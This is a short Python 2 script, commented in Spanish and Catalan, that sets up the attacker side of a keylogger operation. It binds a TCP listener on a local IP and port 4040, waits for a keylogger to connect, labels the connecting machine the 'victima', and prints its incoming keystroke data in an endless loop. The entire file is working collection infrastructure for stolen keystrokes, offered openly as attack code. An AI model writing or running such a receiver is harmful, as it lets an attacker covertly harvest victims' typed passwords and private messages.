import socket

class atacante(object):
	def __init__(self): 
		self.server=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket.AF_INET --> IPv4; socket.SOCKET_STREAM --> Protocolo TCP
		self.host="192.168.1.150" #Definimos el servidor y la IP
		self.port=4040 #Definimos el puerto

	def main(self):
		self.server.bind((self.host, self.port)) #Abrir conexion - Abrir servidor
		self.server.listen(1) #Establecer cuantos equipos se pueden conectar aqui
		print "[INFO] Esperant keylogger...!!!!"
		while True:
			victima, direccion=self.server.accept() #Aceptamos peticion
			print "[INFO] keylogger connectat amb {0}".format(direccion[0])
			
			while True:

				print(victima.recv(2))
